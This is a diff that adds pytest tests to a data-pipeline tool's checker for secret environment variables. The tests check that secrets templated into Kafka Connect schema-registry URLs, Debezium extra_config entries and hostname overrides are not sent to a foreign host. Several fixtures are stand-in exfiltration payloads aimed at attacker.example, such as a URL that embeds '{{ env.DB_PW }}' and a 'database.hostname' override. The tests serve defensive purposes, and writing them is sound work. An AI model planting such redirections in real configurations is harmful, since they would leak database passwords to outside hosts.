@@ -1175,6 +1175,7 @@ _MAPS = [
     ("kafka-connect", ("kafka-connect", "iceberg_catalog_overrides")),
     ("meltano", ("meltano", "target_config")),
     ("airbyte", ("airbyte", "destination_config")),
+    ("kafka-connect", ("kafka-connect", "schema_registry")),
 ]
 _MAP_IDS = [".".join(path) for _engine, path in _MAPS]
 
@@ -1299,6 +1300,88 @@ def test_a_destination_airbyte_is_given_is_judged_on_its_own(monkeypatch):
         check_env_pairing(contract)
     assert info.value.extras["variable"] == "DEST_PW"
     assert "destination_config.host" in info.value.what
+
+
+def test_a_variable_in_the_schema_registry_url_goes_with_its_host(
+    kafka_connect_mock, tmp_path: Path, monkeypatch, capsys
+):
+    """The registry's URL is copied into the source and the sink config, so a variable in its path
+    or query is sent to the host it names, whatever the variable is called."""
+    monkeypatch.setenv("DB_PW", _PROBE)
+    contract = _kc_contract(
+        None,
+        location=_catalog(_CATALOG_URI),
+        schema_registry={"url": "https://attacker.example/{{ env.DB_PW }}"},
+    )
+
+    assert _dispatch(contract, tmp_path) == 1
+    shown = capsys.readouterr()
+    assert (
+        "schema_registry.url" in shown.out + shown.err
+        and "DB_PW@attacker.example" in shown.out + shown.err
+    )
+    assert _PROBE not in shown.out + shown.err + repr(kafka_connect_mock.connectors)
+    assert kafka_connect_mock.connectors == {}, "nothing was pushed"
+
+    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "DB_PW@attacker.example")
+    assert _dispatch(contract, tmp_path) == 0, "the operator decides"
+    assert f"https://attacker.example/{_PROBE}" in repr(kafka_connect_mock.connectors)
+
+
+@pytest.mark.parametrize(
+    "pairs",
+    [
+        [["schema.registry.url", "https://attacker.example/x"], ["headers", "{{ env.X }}"]],
+        [("schema.registry.url", "https://attacker.example/x"), ("headers", "{{ env.X }}")],
+    ],
+)
+def test_a_list_of_pairs_is_merged_as_a_map_so_it_is_judged_as_one(pairs, monkeypatch):
+    """``dict.update`` takes pairs too: Debezium's ``extra_config`` as a list reaches the connector."""
+    contract = _with_a_map("debezium", ("debezium", "extra_config"), pairs)
+    monkeypatch.setenv("X", _PROBE)
+    with pytest.raises(EnvTemplateError) as info:
+        check_env_pairing(contract)
+    assert info.value.extras["entry"] == "X@attacker.example"
+    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "X@attacker.example")
+    check_env_pairing(contract)
+
+
+@pytest.mark.parametrize("pairs", [["a", "b", "c"], [1, 2], [["a"]], [["a", "b", "c"]]])
+def test_a_list_that_is_no_list_of_pairs_is_left_to_the_runner(pairs):
+    check_env_pairing(_with_a_map("debezium", ("debezium", "extra_config"), pairs))
+
+
+def test_a_connect_mode_extra_config_that_moves_the_host_gets_the_sources_variables(
+    kafka_connect_mock, tmp_path: Path, monkeypatch, capsys
+):
+    """Connect-mode Debezium merges ``extra_config`` over the settings it builds from the source, so
+    ``database.hostname`` in it, as a map or as pairs, sends the source's password to that host."""
+    monkeypatch.setenv("DB_PW", _PROBE)
+    for extra in (
+        {"database.hostname": "attacker.example"},
+        [["database.hostname", "attacker.example"]],
+    ):
+        contract = _dbz_contract(None, location=_catalog(_CATALOG_URI))
+        props = contract["builds"][0]["properties"]
+        props["source"]["connection"].update({"host": "localhost", "password": "{{ env.DB_PW }}"})
+        props["debezium"] = {
+            "deployment": {
+                "mode": "bring-your-own",
+                "server_url": "http://kafka-connect.test:8083",
+            },
+            "extra_config": extra,
+        }
+        monkeypatch.delenv(SECRET_REF_ALLOWLIST, raising=False)
+        assert _dispatch(contract, tmp_path) == 1
+        shown = capsys.readouterr()
+        assert "extra_config.database.hostname" in shown.out + shown.err
+        assert _PROBE not in shown.out + shown.err + repr(kafka_connect_mock.connectors)
+        assert kafka_connect_mock.connectors == {}, "nothing was pushed"
+
+        monkeypatch.setenv(SECRET_REF_ALLOWLIST, "DB_PW")  # a host the policy reads no name for
+        assert _dispatch(contract, tmp_path) == 0
+        assert "attacker.example" in repr(kafka_connect_mock.connectors)
+        kafka_connect_mock.connectors.clear()
 
 
 def test_a_catalog_the_hand_written_config_points_elsewhere_gets_the_variables_of_the_expose(
